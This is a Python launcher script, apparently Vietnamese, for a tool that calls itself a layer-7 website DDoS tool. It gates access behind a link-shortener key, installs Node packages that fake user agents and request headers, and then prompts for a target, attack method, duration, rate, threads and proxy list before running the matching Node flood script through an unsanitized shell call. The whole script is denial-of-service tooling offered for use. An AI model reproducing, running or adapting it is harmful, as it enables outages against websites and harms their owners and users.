# code by Shark Hunter
# Muốn Leak à
# Support © 
# https://www.facebook.com/id=MrSharkHunter.vn
# momo : 0827167732
import os
import sys
import colorama
import random
import getpass
import requests
from time import strftime
from colorama import Fore
from colorama import Style
import fade
import time
from time import sleep
import subprocess
from multiprocessing.connection import wait
import socket
# Xoá Tất Cả
os.system("cls" if os.name == "nt" else "clear")
# Nhập key
ngay=int(strftime('%d'))
key1=str(ngay*1246546+23472)
key = 'Shark'+key1

url = 'https://sharkht206.000webhostapp.com/key.html?key='+key
token_link1s = 'f60643a3c709bd39920a4c6044e76e68fc85a947'
link1s = requests.get(f'https://link1s.com/api?api={token_link1s}&url={url}').json()
if link1s['status']=="error": 
	print(link1s['message'])
	quit()
else:
	link_key=link1s['shortenedUrl']
print('Link Để Vượt Key Là: '+link_key)
keynhap = input('Key Đã Vượt Là: ')
if keynhap == key:
    print('Key Đúng Mời Bạn Dùng Tool')
else:
    print("Key Sai Vui Lòng Vượt Link Lại")
    quit()
# Xóa Tất Cả    
os.system("cls" if os.name == "nt" else "clear")
# Mở File Proxy
proxys = open('proxy.txt').readlines()
bots = len(proxys)
# Install
print('''\x1b[38;2;0;255;255m[+] Install Nodejs \n\x1b[38;2;0;255;255m''')
os.system('pkg install nodejs')
print('''\x1b[38;2;0;255;255m[+] success !\n\x1b[38;2;0;255;255m''')
print('''\x1b[38;2;0;255;255m[+] Install Colorama\n\x1b[38;2;0;255;255m''')
os.system('pip install colorama')
print('''\x1b[38;2;0;255;255m[+] success !\n\x1b[38;2;0;255;255m''')
print('''\x1b[38;2;0;255;255m[+] Install Requests \n\x1b[38;2;0;255;255m''')
os.system('pip install requests')
print('''\x1b[38;2;0;255;255m[+] success !\n\x1b[38;2;0;255;255m''')
print('''\x1b[38;2;0;255;255m[+] Install Fade \n\x1b[38;2;0;255;255m''')
os.system('pip install fade')
print('''\x1b[38;2;0;255;255m[+] success !\n\x1b[38;2;0;255;255m''')
print('''\x1b[38;2;0;255;255m[+] Install npm \n\x1b[38;2;0;255;255m''')
os.system('npm install -g npm@10.2.5')
print('''\x1b[38;2;0;255;255m[+] success !\n\x1b[38;2;0;255;255m''')
print('''\x1b[38;2;0;255;255m[+] Install Fake-useragent \n\x1b[38;2;0;255;255m''')
os.system('npm i fake-useragent')
print('''\x1b[38;2;0;255;255m[+] success !\n\x1b[38;2;0;255;255m''')
print('''\x1b[38;2;0;255;255m[+] Install Header-generator \n\x1b[38;2;0;255;255m''')
os.system('npm i header-generator')
print('''\x1b[38;2;0;255;255m[+] success !\n\x1b[38;2;0;255;255m''')
# Xoá All
os.system("cls" if os.name == "nt" else "clear")
print('3')
time.sleep(0.10)
print('2')
time.sleep(0.8)
print('1')
time.sleep(0.6)
print('>>> \x1b[36mstart...')
time.sleep(0.4)
os.system("cls" if os.name == "nt" else "clear")
def banner():
  time.sleep(0.10)
  print("""
\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mShark HT \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mBanner Shark HT \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: Shark HT \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v2.0""")
time.sleep(0.8)
print(Fore.BLUE + Style.BRIGHT + """  ██████  ██░ ██  ▄▄▄       ██▀███   ██ ▄█▀    ██░ ██ ▄▄▄█████▓
▒██    ▒ ▓██░ ██▒▒████▄    ▓██ ▒ ██▒ ██▄█▒    ▓██░ ██▒▓  ██▒ ▓▒
░ ▓██▄   ▒██▀▀██░▒██  ▀█▄  ▓██ ░▄█ ▒▓███▄░    ▒██▀▀██░▒ ▓██░ ▒░
  ▒   ██▒░▓█ ░██ ░██▄▄▄▄██ ▒██▀▀█▄  ▓██ █▄    ░▓█ ░██ ░ ▓██▓ ░ 
▒██████▒▒░▓█▒░██▓ ▓█   ▓██▒░██▓ ▒██▒▒██▒ █▄   ░▓█▒░██▓  ▒██▒ ░ 
▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒    ▒ ░░▒░▒  ▒ ░░   
░ ░▒  ░ ░ ▒ ░▒░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒ ▒░    ▒ ░▒░ ░    ░    
░  ░  ░   ░  ░░ ░  ░   ▒     ░░   ░ ░ ░░ ░     ░  ░░ ░  ░      
      ░   ░  ░  ░      ░  ░   ░     ░  ░       ░  ░  ░         
                         
\x1b[34m╔══════════════════════════════════╗
\x1b[34m║ \x1b[38;2;0;212;14m[+] \x1b[36mhttps://t.me/MrSharkHunter💻\x1b[34m ║
\x1b[34m║ \x1b[38;2;0;212;14m[+] \x1b[36mTOOL DDOS WEBSITE L7      💻\x1b[34m ║
\x1b[34m║ \x1b[38;2;0;212;14m[+] \x1b[36mTool By Shark Hunter      💻\x1b[34m ║
\x1b[34m╚══════════════════════════════════╝""" + Style.RESET_ALL)
time.sleep(0.6)
# Hiện Method Để Chạy File
print(Fore.BLUE + Style.BRIGHT + """
|——————————————————————————————————————————————————————————|
| - - - - - - - M E T H O D S--L A Y E R 7 - - - - - - - - |
| \x1b[32m[+] 1\x1b[34m•\x1b[33mHTTP-MIX   \x1b[34m                                       •|
| \x1b[32m[+] 2\x1b[34m•\x1b[33mHTTP-RAW   \x1b[34m                                       •|
| \x1b[32m[+] 3\x1b[34m•\x1b[33mHTTP-GOV   \x1b[34m                                       •|
| \x1b[32m[+] 4\x1b[34m•\x1b[33mHTTP-VIP   \x1b[34m                                       •|
|——————————————————————————————————————————————————————————|
|\x1b[33mLưu Ý: Nhập Đúng METHOD Nào Không Có Để Thì Bỏ Qua (enter)\x1b[34m|
|——————————————————————————————————————————————————————————|
""" + Style.RESET_ALL)
time.sleep(0.4)
# Command Để Chạy Từng File
def execute_command(method, target, time, thread, rate, proxy):

    command = f'node {method}.js {target} {time} {rate} {thread} {proxy}'
    
    subprocess.call(command, shell=True)

# Hàm main để lấy thông tin từ người dùng và gọi hàm execute_command
time.sleep(0.2)
def main():
    target = input(Fore.RED + Style.BRIGHT + '''╔═══[Shark-HT_TARGET@Root]\n╚══> ''' + Style.RESET_ALL)
    method = input(Fore.RED + Style.BRIGHT + '''╔═══[Shark-HT_METHOD@Root]\n╚══> ''' + Style.RESET_ALL)
    time = input(Fore.RED + Style.BRIGHT + '''╔═══[Shark-HT_TIME@Root]\n╚══> ''' + Style.RESET_ALL)
    rate = input(Fore.RED + Style.BRIGHT + '''╔═══[Shark-HT_RATE@Root]\n╚══> ''' + Style.RESET_ALL)
    thread = input(Fore.RED + Style.BRIGHT + '''╔═══[Shark-HT_THREAD@Root]\n╚══> ''' + Style.RESET_ALL)
    proxy = input(Fore.RED + Style.BRIGHT + '''╔═══[Shark-HT_PROXY@Root]\n╚══> ''' + Style.RESET_ALL)
    print(Fore.RED + Style.BRIGHT + """⚡ＡＴＴＡＣＫ-ＳＥＮＴ--ＰＬＡＮ:ᐯＩＰ🚀\x1b[38;2;0;212;14m
    SHARK HUNTER 💻""" + Style.RESET_ALL)
    execute_command(method, target, time, thread, rate, proxy)

# Gọi hàm main để chạy công cụ
if __name__ == "__main__":
    main()
